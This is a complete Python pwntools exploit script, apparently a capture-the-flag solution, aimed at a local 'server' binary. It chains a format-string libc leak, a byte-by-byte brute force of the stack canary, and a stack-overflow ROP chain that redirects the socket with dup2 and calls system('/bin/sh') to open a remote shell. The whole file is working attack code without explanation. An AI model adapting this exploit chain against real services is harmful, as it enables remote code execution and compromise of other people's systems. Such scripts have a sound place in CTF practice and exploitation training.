from pwn import *

elf = ELF("server")
# use docker libc for docker
libc = ELF("docker_libc.so.6")
# use normal for remote
# libc = ELF("`libc.so.6")
address = "localhost"
port = 1337
info("Getting LibC Leak")
p = remote(address, port)
p.sendlineafter(b"=>", b"A" * 15)
p.sendlineafter(b"=>", b"6")
p.sendlineafter(b"=>", b"1")
p.sendlineafter(b"=>", b"%2$p")
p.sendlineafter(b"=>", b"5")
p.recvuntil(b"Table for")
libc_leak = p.recvuntil(b"\n")
libc_leak = libc_leak.strip()
libc_leak = libc_leak[2:]
print(libc_leak)
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - (libc.sym.lseek64 + 11)
info("LibC Leak 0x%x", libc_leak)
info("LibC Base Address 0x%x", libc.address)
p.close()

info("Cracking canary")
notCracked = True
canaryPos = 0
currentByte = 0
canaryBytes = []
finalCanary = b""
# finalCanary = 0x818BBD42F8E11B
while notCracked:
    p = remote(address, port, level="error")
    p.sendlineafter(b"=>", b"A" * 15)
    p.sendlineafter(b"=>", b"6")
    p.sendlineafter(b"=>", b"1")
    p.sendlineafter(b"=>", b"1")
    p.sendlineafter(b"=>", b"2")
    p.sendlineafter(b"=>", b"A" * 255)
    p.sendlineafter(b"=>", b"y")
    payload = b"A" * 8
    for i in range(len(canaryBytes)):
        payload += p8(canaryBytes[i])
    payload += p8(currentByte)
    p.sendafter(b"=>", payload)
    try:
        p.recvuntil(b"=>")
        canaryBytes.append(currentByte)
        info("Canary Byte 0x%x found at %d", currentByte, canaryPos)
        canaryPos += 1
        currentByte = 0
        p.close()
    except:
        currentByte += 1
        p.close()
    if len(canaryBytes) == 8:
        for i in range(len(canaryBytes)):
            finalCanary += p8(canaryBytes[i])
        info("Found canary 0x%s", enhex(finalCanary))
        notCracked = False

info("Getting a shell")
rop = ROP(libc.path)
pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = libc.address + rop.find_gadget(["pop rsi", "ret"]).address
dup2 = libc.sym.dup2
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym.system

p = remote(address, port, level="error")
p.sendlineafter(b"=>", b"A" * 15)
p.sendlineafter(b"=>", b"6")
p.sendlineafter(b"=>", b"1")
p.sendlineafter(b"=>", b"1")
p.sendlineafter(b"=>", b"2")
p.sendlineafter(b"=>", b"A" * 255)
p.sendlineafter(b"=>", b"y")
payload = b"A" * 8
for i in range(len(canaryBytes)):
    payload += p8(canaryBytes[i])
payload += b"A" * 8
payload += p64(pop_rdi) + p64(4) + p64(pop_rsi) + p64(0)
payload += p64(dup2)
payload += p64(pop_rdi) + p64(4) + p64(pop_rsi) + p64(1)
payload += p64(dup2)
payload += p64(pop_rdi) + p64(4) + p64(pop_rsi) + p64(2)
payload += p64(dup2)
payload += p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendafter(b"=>", payload)
p.interactive()
